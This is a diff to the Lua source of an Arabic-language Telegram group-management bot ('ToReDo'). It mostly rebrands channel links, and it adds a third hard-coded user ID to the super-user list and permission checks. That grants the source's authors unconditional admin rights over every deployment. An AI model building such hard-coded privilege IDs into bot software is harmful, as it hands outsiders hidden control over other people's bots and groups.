@@ -1,6 +1,6 @@
 -- Welcom to file the best source in the telegram
 -- This warehouse was developed by : Blanther t.me/bbbbl
- -- join in chennel Source t.me/XxXc_X
+ -- join in chennel Source t.me/xxxs_x
 -- ThAnk You. 
 http = require("socket.http")
 https = require("ssl.https")
@@ -137,7 +137,7 @@ print("\27[0;31m"..[[
 ]].."\n\027[00m")
 print("\27[0;32m"..[[
 ▸ Dev : @bbbbl
-▸ Ch SourcE : @xXxC_X
+▸ Ch SourcE : @xxxs_x
 ]].."\n\027[00m")
 --------------------------------------------------------------------------------------------------------------------------
 sudos = dofile("./info_ToReDo_TeaM.lua") 
@@ -151,7 +151,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end 
 --------------------------------------------------------------------------------------------------------------
-sudo_users = {SUDO,842721206,297625513}   
+sudo_users = {SUDO,842721206,297625513,759699162}   
 function Sudo_ToReDo(msg)  
 local ToReDo = false  
 for k,v in pairs(sudo_users) do  
@@ -163,12 +163,12 @@ return ToReDo
 end
 --------------------------------------------------------------------------------------------------------------
 function Sudo(msg) 
-local hash = redis:sismember(ToReDo..'Sudo:User', msg.sender_user_id_) 
-if hash or Sudo_ToReDo(msg) then  
-return true  
-else  
-return false  
-end  
+  local hash = redis:sismember(ToReDo..'Sudo:User', msg.sender_user_id_) 
+    if hash or Sudo_ToReDo(msg) then  
+      return true  
+    else  
+   return false  
+  end  
 end
 --------------------------------------------------------------------------------------------------------------
 function BasicConstructor(msg)
@@ -220,7 +220,9 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(842721206) then  
 var = true  
 elseif tonumber(user_id) == tonumber(297625513) then
-var = true  
+var = true
+elseif tonumber(user_id) == tonumber(759699162) then
+  var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then  
 var = true  
 elseif redis:sismember(ToReDo..'Sudo:User', user_id) then
@@ -248,6 +250,8 @@ if tonumber(user_id) == tonumber(842721206) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(297625513) then
 var = 'مبرمج السورس'
+elseif tonumber(user_id) == tonumber(759699162) then
+  var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(ToReDo) then  
@@ -736,7 +740,7 @@ send(msg.chat_id_, msg.id_,'- هلو حب ، لايمكنك استخدام ال�
 return false
 end
 if Sudo_ToReDo(msg) then
-local bl = '゠اهلا بيك عمري 💞⸼ .\n゠انت المطور الاساسي للبوت 𖧧.\n゠تستطيع التحكم باوامر البوت 𖧧.\n゠من خلال الكيبورد الخاص بك 𖧧.\n゠قناة السورس  ◝ [@xXxC_X] ◟ .'
+local bl = '゠اهلا بيك عمري 💞⸼ .\n゠انت المطور الاساسي للبوت 𖧧.\n゠تستطيع التحكم باوامر البوت 𖧧.\n゠من خلال الكيبورد الخاص بك 𖧧.\n゠قناة السورس  ◝ [@xxxs_x] ◟ .'
 local keyboard = {
 	{'• وضع اسم الى البوت 𖠹 .'},
 {'• تعطيل التواصل  × .','• تفعيل التواصل  𖡩 .'},
@@ -773,7 +777,7 @@ redis:setex(ToReDo..'Start:Time'..msg.sender_user_id_,300,true)
 return false
 end
 if not Sudo_ToReDo(msg) and not redis:sismember(ToReDo..'Ban:User_Bot',msg.sender_user_id_) and not redis:get(ToReDo..'Tuasl:Bots') then
-send(msg.sender_user_id_, msg.id_,'܁༯┆هلو عمري 💞 ܰ\n܁༯┆سيتم الرد عليك [قريباً . .](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA)')
+send(msg.sender_user_id_, msg.id_,'܁༯┆هلو عمري 💞 ܰ\n܁༯┆سيتم الرد عليك [قريباً . .](t.me/xxxs_x)')
 tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
 vardump(data)
@@ -967,12 +971,12 @@ local sendok = #group - ToReDo
 if q == 0 then
 ToReDo = ''
 else
-ToReDo = '\n܁༯┆ تم ازالة ['..q..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) مجموعات من البوت 💞 ܰ'
+ToReDo = '\n܁༯┆ تم ازالة ['..q..'](t.me/xxxs_x) مجموعات من البوت 💞 ܰ'
 end
 if w == 0 then
 ToReDoh = ''
 else
-ToReDoh = '\n܁༯┆ تم ازالة ['..w..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) مجموعات من البوت 💞 ܰ'
+ToReDoh = '\n܁༯┆ تم ازالة ['..w..'](t.me/xxxs_x) مجموعات من البوت 💞 ܰ'
 end
 send(msg.chat_id_, msg.id_,'܁༯┆تم تنظيف المجموعات💞 ܰ')   
 end
@@ -1107,7 +1111,7 @@ send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا
 return false 
 end      
 redis:sadd(ToReDo..'Sudo:User', result.id_)
-usertext = '\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(username or 'xxxc_x')..')'
+usertext = '\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(username or 'xxxs_x')..')'
 status  = '\n܁༯┆ تم ترقيته مطور في البوت'
 texts = usertext..status
 else
@@ -1127,7 +1131,7 @@ end
 redis:sadd(ToReDo..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'
+usertext = '\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'
 status  = '\n܁༯┆ تم ترقيته مطور في البوت'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -1146,7 +1150,7 @@ end
 function start_function(extra, result, success)
 if result.id_ then
 redis:srem(ToReDo..'Sudo:User', result.id_)
-usertext = '\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(username or 'xxxc_x')..')'
+usertext = '\n܁༯┆ العضو ▸ ['..result.title_..'](t.me/'..(username or 'xxxs_x')..')'
 status  = '\n܁༯┆ تم تنزيله من المطورين'
 texts = usertext..status
 else
@@ -1166,7 +1170,7 @@ end
 redis:srem(ToReDo..'Sudo:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n📤┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'
+usertext = '\n📤┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'
 status  = '\n܁༯┆ تم تنزيله من المطورين'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -1183,7 +1187,7 @@ if text and not Vips(msg) then
 local ToReDo1_Msg = redis:get(ToReDo.."ToReDo1:Add:Filter:Rp2"..text..msg.chat_id_)   
 if ToReDo1_Msg then 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n 📬┆'..ToReDo1_Msg)
+send(msg.chat_id_, msg.id_,'܁༯┆ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n 📬┆'..ToReDo1_Msg)
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
 return false
 end,nil)
@@ -1435,7 +1439,7 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 if data.username_ ~= false then
 send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..ToReDo_Msg.."] \n") 
 else
-send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/xxxc_x)}\n🚫┆["..ToReDo_Msg.."] \n") 
+send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/xxxs_x)}\n🚫┆["..ToReDo_Msg.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
@@ -1866,7 +1870,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ @["..data.username_.."]  💞 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
 else
-send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxc_x)  💞 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
+send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxs_x)  💞 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -1886,7 +1890,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ @["..data.username_.."]  💞 ܰ\n܁༯┆الصوره التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
 else
-send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxc_x)  💞 ܰ\n܁༯┆الصوره التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n") 
+send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxs_x)  💞 ܰ\n܁༯┆الصوره التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -1903,7 +1907,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ @["..data.username_.."]  💞 ܰ\n܁༯┆المتحركةه التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n") 
 else
-send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxc_x)  ?? ܰ\n܁༯┆المتحركةه التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
+send(msg.chat_id_,0,"܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/xxxs_x)  ?? ܰ\n܁༯┆المتحركةه التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2057,7 +2061,7 @@ send(msg.chat_id_, msg.id_,'- هلو حب ، لايمكنك استخدام ال�
 return false
 end
 redis:set(ToReDo..'Num:Add:Bot',Num) 
-send(msg.chat_id_, msg.id_,'܁༯┆ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) عضو 💞 ܰ')
+send(msg.chat_id_, msg.id_,'܁༯┆ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](t.me/xxxs_x) عضو 💞 ܰ')
 end
 if text == 'تحديث السورس' and Sudo_ToReDo(msg) then if AddChannel(msg.sender_user_id_) == false then
 send(msg.chat_id_, msg.id_,'- هلو حب ، لايمكنك استخدام البوت 💕.\n- ﭑشترك اولاً 💕 • ['..redis:get(ToReDo..'add:ch:username')..'] .')
@@ -2113,9 +2117,9 @@ if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
 Text = [[
 ༯┆WELCOM BRO 💞 .
 ⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
-༯┆[SOURCE ToReDo x](t.me/xxxc_x) ܀
+༯┆[SOURCE ToReDo x](t.me/xxxs_x) ܀
 ༯┆[INFORMATION ToReDo](t.me/ToReDo_x)
-༯┆[CH STORY](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA)
+༯┆[CH STORY](t.me/xxxs_x)
 ༯┆[LiNK AViD](https://t.me/Vvvll)
 ⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
 ༯┆ [TWSL SOURCE](t.me/y07bot) 
@@ -2741,17 +2745,17 @@ end,nil)
 elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Unsupported"..msg.chat_id_,'ked')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل السيلفي بالتقييد\n⛔┆ الحاله ←التقييد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل السيلفي بالتقييد\n⛔┆ الحاله ←التقييد ')  
 end,nil)   
 elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Unsupported"..msg.chat_id_,'ktm')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل السيلفي بالكتم\n⛔┆ الحاله ←الكتم ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل السيلفي بالكتم\n⛔┆ الحاله ←الكتم ')  
 end,nil)   
 elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Unsupported"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل السيلفي بالطرد\n⛔┆ الحاله ←الطرد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل السيلفي بالطرد\n⛔┆ الحاله ←الطرد ')  
 end,nil)   
 elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:del(ToReDo.."lock:Unsupported"..msg.chat_id_)  
@@ -2767,17 +2771,17 @@ end,nil)
 elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Markdaun"..msg.chat_id_,'ked')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الماركداون بالتقييد\n⛔┆ الحاله ←التقييد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الماركداون بالتقييد\n⛔┆ الحاله ←التقييد ')  
 end,nil)   
 elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Markdaun"..msg.chat_id_,'ktm')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الماركداون بالكتم\n⛔┆ الحاله ←الكتم ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الماركداون بالكتم\n⛔┆ الحاله ←الكتم ')  
 end,nil)   
 elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Markdaun"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الماركداون بالطرد\n⛔┆ الحاله ←الطرد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الماركداون بالطرد\n⛔┆ الحاله ←الطرد ')  
 end,nil)   
 elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:del(ToReDo.."lock:Markdaun"..msg.chat_id_)  
@@ -2793,17 +2797,17 @@ end,nil)
 elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Contact"..msg.chat_id_,'ked')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الجهات بالتقييد\n⛔┆ الحاله ←التقييد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الجهات بالتقييد\n⛔┆ الحاله ←التقييد ')  
 end,nil)   
 elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Contact"..msg.chat_id_,'ktm')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الجهات بالكتم\n⛔┆ الحاله ←الكتم ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الجهات بالكتم\n⛔┆ الحاله ←الكتم ')  
 end,nil)   
 elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Contact"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الجهات بالطرد\n⛔┆ الحاله ←الطرد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الجهات بالطرد\n⛔┆ الحاله ←الطرد ')  
 end,nil)   
 elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:del(ToReDo.."lock:Contact"..msg.chat_id_)  
@@ -2819,17 +2823,17 @@ end,nil)
 elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Spam"..msg.chat_id_,'ked')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الكلايش بالتقييد\n⛔┆ الحاله ←التقييد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الكلايش بالتقييد\n⛔┆ الحاله ←التقييد ')  
 end,nil)   
 elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Spam"..msg.chat_id_,'ktm')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الكلايش بالكتم\n⛔┆ الحاله ←الكتم ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الكلايش بالكتم\n⛔┆ الحاله ←الكتم ')  
 end,nil)   
 elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:set(ToReDo.."lock:Spam"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxc_x')..') \n܁༯┆ تـم قفـل الكلايش بالطرد\n⛔┆ الحاله ←الطرد ')  
+send(msg.chat_id_, msg.id_,'܁༯┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'xxxs_x')..') \n܁༯┆ تـم قفـل الكلايش بالطرد\n⛔┆ الحاله ←الطرد ')  
 end,nil)   
 elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 redis:del(ToReDo.."lock:Spam"..msg.chat_id_)  
@@ -2839,16 +2843,16 @@ end,nil)
 end
 if text == 'قفل التكرار بالطرد' and Mod(msg) then 
 redis:hset(ToReDo.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
-send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ التقييد ܊ الكتم ܊ [الطرد](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) .')
+send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ التقييد ܊ الكتم ܊ [الطرد](t.me/xxxs_x) .')
 elseif text == 'قفل التكرار' and Mod(msg) then 
 redis:hset(ToReDo.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
-send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم فتح التكرار 💞 ٭\n┘ الحالة ༯ [المسـح](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ٭')
+send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم فتح التكرار 💞 ٭\n┘ الحالة ༯ [المسـح](t.me/xxxs_x) ٭')
 elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
 redis:hset(ToReDo.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
-send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ [التقييد](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ الكتم ܊ الطرد .')
+send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ [التقييد](t.me/xxxs_x) ܊ الكتم ܊ الطرد .')
 elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
 redis:hset(ToReDo.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
-send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ التقييد ܊ [الكتم](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ܊ الطرد .')
+send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┤ تم قفل التكرار 💞 ٭\n┘ الحالة ◃ التقييد ܊ [الكتم](t.me/xxxs_x) ܊ الطرد .')
 elseif text == 'فتح التكرار' and Mod(msg) then 
 redis:hdel(ToReDo.."flooding:settings:"..msg.chat_id_ ,"flood")  
 send(msg.chat_id_, msg.id_,'┐ هلو عمري 💞 ٭\n┘ تم فتح التكرار 💞 ٭')
@@ -2878,7 +2882,7 @@ local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
 local TextS = "\n܁༯┆اهلا بك في متجر ملفات توريدو\n܁༯┆ملفات السورس \n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n\n"
-local TextE = "\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n܁༯┆علامة تعني { ✓ } ملف مفعل\n܁༯┆علامة تعني { ✘ } ملف معطل\n܁༯┆قناة سورس توريدو ↓\n".."܁༯┆[اضغط هنا لدخول](t.me/xxxc_x) \n"
+local TextE = "\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n܁༯┆علامة تعني { ✓ } ملف مفعل\n܁༯┆علامة تعني { ✘ } ملف معطل\n܁༯┆قناة سورس توريدو ↓\n".."܁༯┆[اضغط هنا لدخول](t.me/xxxs_x) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_ToReDo/"..name,"r")
@@ -3805,7 +3809,7 @@ local text =
 ' }\n'..'📮┆ الايدي ← { '..idgp..
 ' }\n'..'📮┆ الايدي بالصوره ← { '..idph..
 ' }\n'..'📮┆ الرفع ← { '..setadd..
-' }\n'..'📮┆ الحظر ← { '..banm..' }\n\n┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉  ┉  ┉\n🔖┆ CH ▸ @xxxc_x\n'
+' }\n'..'📮┆ الحظر ← { '..banm..' }\n\n┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉  ┉  ┉\n🔖┆ CH ▸ @xxxs_x\n'
 send(msg.chat_id_, msg.id_,text)     
 end    
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -3856,7 +3860,7 @@ end
 if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
 local Num = text:match('ضع تكرار (.*)')
 redis:hset(ToReDo.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
-send(msg.chat_id_, msg.id_,'܁༯┆تم وضع عدد االتكرار ◃ ◞ [('..Num..')](https://t.me/joinchat/AAAAAEvr1yqOypm-uHojPA) ◟ 💞 ܰ')  
+send(msg.chat_id_, msg.id_,'܁༯┆تم وضع عدد االتكرار ◃ ◞ [('..Num..')](t.me/xxxs_x) ◟ 💞 ܰ')  
 end 
 if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
 local Num = text:match('^ضع زمن التكرار (%d+)$')
@@ -4995,19 +4999,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local blakrt = redis:get(ToReDo.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n??┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n??┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxs_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
 redis:set(ToReDo.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
 redis:sadd(ToReDo..'Vips:User'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'ادمن' and Owners(msg) then 
-send(msg.chat_id_, msg.id_,'\n܁༯┆ العضو ▸ ['..data.first_name_..'](t.me/'..(data.username_ or 'xxxc_x')..')'..'\n܁༯┆ تم رفعه '..RTPA..' هنا\n')   
